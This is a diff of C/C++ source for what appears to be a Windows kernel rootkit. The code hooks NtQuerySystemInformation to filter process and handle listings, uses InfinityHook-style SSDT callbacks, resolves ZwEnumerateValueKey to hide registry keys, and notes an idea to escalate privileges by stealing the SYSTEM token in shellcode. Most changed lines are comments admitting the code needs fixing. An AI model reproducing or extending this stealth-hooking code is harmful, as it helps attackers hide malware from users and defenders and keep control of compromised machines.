@@ -184,8 +184,8 @@ NTSTATUS NTAPI HOOKED_SYSTEM_PROCESS_INFORMATION( //Hooked NtQuerySystemINformat
     return status;
 }
 
-//Thanks a lot to "sam-b" on github for these defs!
-
+//Thanks a lot to "sam-b" on github for these some definitions used here!
+// This needs some fixing to do
 NTSTATUS NTAPI HOOKED_SYSTEM_HANDLE_INFORMATION_EX(
     ULONG_PTR HandleCount,
     ULONG_PTR Reserved,
@@ -193,14 +193,14 @@ NTSTATUS NTAPI HOOKED_SYSTEM_HANDLE_INFORMATION_EX(
 )
 {
 //Again first call orginal etc
-    ULONG len = 20;
+  ULONG len = 20;
 	NTSTATUS status = (NTSTATUS)0xc0000004;
 	PSYSTEM_HANDLE_INFORMATION_EX pHandleInfo = NULL;
 	do {
 		len *= 2;
 		pHandleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)GlobalAlloc(GMEM_ZEROINIT, len);
 
-        status = ZwQuerySystemInformation(reinterpret_cast<SYSTEM_INFORMATION_CLASS>(SystemExtendedHandleInformation),  pHandleInfo, len, &len);
+    status = g_SysInfo(reinterpret_cast<SYSTEM_INFORMATION_CLASS>(SystemExtendedHandleInformation),  pHandleInfo, len, &len);
 
 	} while (status == (NTSTATUS) 0xc0000004);
     for (int i = 0; i < pHandleInfo->HandleCount; i++) {
@@ -316,6 +316,7 @@ NTSTATUS name2pid(PCWSTR executable_name, PHANDLE pOutHandle)
     return found ? STATUS_SUCCESS : STATUS_NOT_FOUND;
 }
 
+// I am not sure if you can do this to be honest so fix this by just using ZwQuerySysinfo
 BOOLEAN IsProcessRunning(const wchar_t *processName){
     log_debug("Checking if process %s is running...", processName);
     BOOLEAN exists = FALSE;
@@ -333,10 +334,10 @@ BOOLEAN IsProcessRunning(const wchar_t *processName){
 
 /*
 idea to start a process woth higher privileges;
-EoP in shellcode by stealing SYSTEM token
+EoP in shellcode by stealing SYSTEM token, but I dokt quite gez why this is usefull since a user process can do the same
 */
 
-//Big thanks to "ThomasonZoa" on github for InfinityHookProMax!
+//Big thanks to "ThomasonZoa" on github for InfinityHookPro! Very intresting and cool project
 
 void __fastcall SysInfo_call_back(unsigned long ssdt_index, void** ssdt_address){
     UNREFERENCED_PARAMETER(ssdt_index);
@@ -437,6 +438,7 @@ VOID DelayTimeWorkItem(PDEVICE_OBJECT DeviceObject, PVOID Context){
     }
 
     if (E_HideKeys){
+// We need to fix this to hook both functions
         wcscpy(name, L"ZwEnumerateValueKey");
         RtlInitUnicodeString(&str, name);
         g_EnumValKey = (ZwEnumerateValueKey_t)MmGetSystemRoutineAddress(&str);
